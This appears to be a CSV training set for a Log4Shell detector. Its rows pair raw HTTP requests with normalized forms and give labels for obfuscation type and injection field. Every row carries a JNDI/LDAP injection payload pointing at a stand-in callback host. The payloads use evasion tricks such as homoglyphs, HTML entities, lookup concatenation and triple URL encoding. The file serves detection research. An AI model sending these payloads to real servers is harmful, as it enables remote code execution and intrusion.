id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-002406,2026-05-17,adversarial_evasion,GET /search?q=${jndі:ldap://lab-callback.example.org/cyrillic-i} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndі:ldap://lab-callback.example.org/cyrillic-i} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,homoglyph_jndi,path,train,critical
LS-002407,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jndі:ldap://lab-callback.example.org/cyrillic-i},post /search http/1.1 host: app.local body: query=${jndі:ldap://lab-callback.example.org/cyrillic-i},1,log4shell,homoglyph_jndi,body,train,critical
LS-002408,2026-05-17,adversarial_evasion,GET /?q=${jndі:ldap://lab-callback.example.org/cyrillic-i} HTTP/1.1,get /?q=${jndі:ldap://lab-callback.example.org/cyrillic-i} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-002409,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndі:ldap://lab-callback.example.org/cyrillic-i} HTTP/1.1 Host: app.local,get /api/check?debug=${jndі:ldap://lab-callback.example.org/cyrillic-i} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-002410,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i} | method: get | host: app.local | path: /search?q=boots,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-002411,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i},request from user-agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-002412,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jndі:ldap://lab-callback.example.org/cyrillic-i},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${jndі:ldap://lab-callback.example.org/cyrillic-i},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-002413,2026-05-17,adversarial_evasion,GET /?q=${&#106;ndi:ldap://lab-callback.example.org/html-decimal} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/html-decimal} http/1.1,1,log4shell,html_entity_jndi,minimal_query,train,critical
LS-002414,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#106;ndi:ldap://lab-callback.example.org/html-decimal} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/html-decimal} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,train,critical
LS-002415,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://lab-callback.example.org/html-decimal} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://lab-callback.example.org/html-decimal} | method: get | host: app.local | path: /static/app.js,1,log4shell,html_entity_jndi,user_agent,train,critical
LS-002416,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://lab-callback.example.org/html-decimal},request from user-agent: ${jndi:ldap://lab-callback.example.org/html-decimal},1,log4shell,html_entity_jndi,user_agent_minimal,train,critical
LS-002417,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${&#106;ndi:ldap://lab-callback.example.org/html-decimal},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/html-decimal},1,log4shell,html_entity_jndi,x_api_version,train,critical
LS-002418,2026-05-17,adversarial_evasion,GET /search?q=${&#106;ndi:ldap://lab-callback.example.org/html-decimal} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://lab-callback.example.org/html-decimal} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,html_entity_jndi,path,train,critical
LS-002419,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#106;ndi:ldap://lab-callback.example.org/html-decimal},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/html-decimal},1,log4shell,html_entity_jndi,body,train,critical
LS-002420,2026-05-17,adversarial_evasion,GET /?q=${&#106;ndi:ldap://lab-callback.example.org/html-decimal} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/html-decimal} http/1.1,1,log4shell,html_entity_jndi,minimal_query,train,critical
LS-002421,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#106;ndi:ldap://lab-callback.example.org/html-decimal} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/html-decimal} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,train,critical
LS-002422,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://lab-callback.example.org/html-decimal} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://lab-callback.example.org/html-decimal} | method: get | host: app.local | path: /static/app.js,1,log4shell,html_entity_jndi,user_agent,train,critical
LS-002423,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://lab-callback.example.org/html-decimal},request from user-agent: ${jndi:ldap://lab-callback.example.org/html-decimal},1,log4shell,html_entity_jndi,user_agent_minimal,train,critical
LS-002424,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${&#106;ndi:ldap://lab-callback.example.org/html-decimal},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/html-decimal},1,log4shell,html_entity_jndi,x_api_version,train,critical
LS-002425,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/full-split} http/1.1,1,log4shell,lookup_character_concat,minimal_query,train,critical
LS-002426,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/full-split} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,train,critical
LS-002427,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://lab-callback.example.org/full-split} | method: get | host: app.local | path: /static/app.js,1,log4shell,lookup_character_concat,user_agent,train,critical
LS-002428,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split},request from user-agent: ${jndi:ldap://lab-callback.example.org/full-split},1,log4shell,lookup_character_concat,user_agent_minimal,train,critical
LS-002429,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://lab-callback.example.org/full-split},1,log4shell,lookup_character_concat,x_api_version,train,critical
LS-002430,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://lab-callback.example.org/full-split} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,lookup_character_concat,path,train,critical
LS-002431,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/full-split},1,log4shell,lookup_character_concat,body,train,critical
LS-002432,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/full-split} http/1.1,1,log4shell,lookup_character_concat,minimal_query,train,critical
LS-002433,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/full-split} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,train,critical
LS-002434,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://lab-callback.example.org/full-split} | method: get | host: app.local | path: /,1,log4shell,lookup_character_concat,user_agent,train,critical
LS-002435,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split},request from user-agent: ${jndi:ldap://lab-callback.example.org/full-split},1,log4shell,lookup_character_concat,user_agent_minimal,train,critical
LS-002436,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://lab-callback.example.org/full-split},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://lab-callback.example.org/full-split},1,log4shell,lookup_character_concat,x_api_version,train,critical
LS-002437,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-002438,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-002439,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} | method: get | host: app.local | path: /search?q=boots,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-002440,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},request from user-agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-002441,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /login | x-api-version: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-002442,2026-05-17,adversarial_evasion,GET /search?q=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,semantic_lookup_jndi,path,train,critical
LS-002443,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},post /search http/1.1 host: app.local body: query=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},1,log4shell,semantic_lookup_jndi,body,train,critical
LS-002444,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-002445,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-002446,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} | Method: GET | Host: app.local | Path: /,request from user-agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j} | method: get | host: app.local | path: /,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-002447,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},request from user-agent: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-002448,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${${date:'j'}ndi:ldap://lab-callback.example.org/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-002449,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-002450,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-002451,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://lab-callback.example.org/triple-train} | method: get | host: app.local | path: /login,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-002452,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://lab-callback.example.org/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-002453,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D,request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://lab-callback.example.org/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-002454,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://lab-callback.example.org/triple-train} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,triple_url_encoded,path,train,critical
LS-002455,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flab-callback.example.org%25252Ftriple-train%25257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/triple-train},1,log4shell,triple_url_encoded,body,train,critical
